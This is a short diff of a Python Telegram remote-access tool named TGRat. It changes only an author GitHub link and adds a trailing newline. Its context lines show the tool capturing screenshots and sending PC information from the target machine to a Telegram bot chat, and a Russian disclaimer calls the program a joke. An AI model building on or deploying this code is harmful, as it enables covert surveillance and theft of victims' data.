@@ -8,7 +8,7 @@
 =============================================
             ｂｙ ｂ１ｔ０ｎｅ
         tg: https://t.me/w0rld_adm1n
-    github: https://github.com/ArtemChikc
+    github: https://github.com/b1t0nese
 '''
 import telebot
 from telebot import types
@@ -130,7 +130,7 @@ class TGRat:
 ПРОГРАММА СДЕЛАНА ИСКЛЮЧИТЕЛЬНО В ШУТОЧНЫХ ЦЕЛЯХ!!! КАТЕГОРИЧЕСКИ НЕЛЬЗЯ ИСПОЛЬЗОВАТЬ ДЛЯ НАНЕСЕНИЯ ВРЕДА КОМПЬЮТЕРУ И СЛЕЖКИ!!!
 
 <b><i>by b1t0ne</i></b>
-github: https://github.com/ArtemChikc'''
+github: https://github.com/b1t0nese'''
 
             functions.pag.screenshot(self.config.screen_path)
             self.bot.send_message(message.chat.id, f"{pc_info}\n\n{help_c}".format(message.from_user, self.bot.get_me()), parse_mode="HTML", reply_markup=markup)
@@ -345,3 +345,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
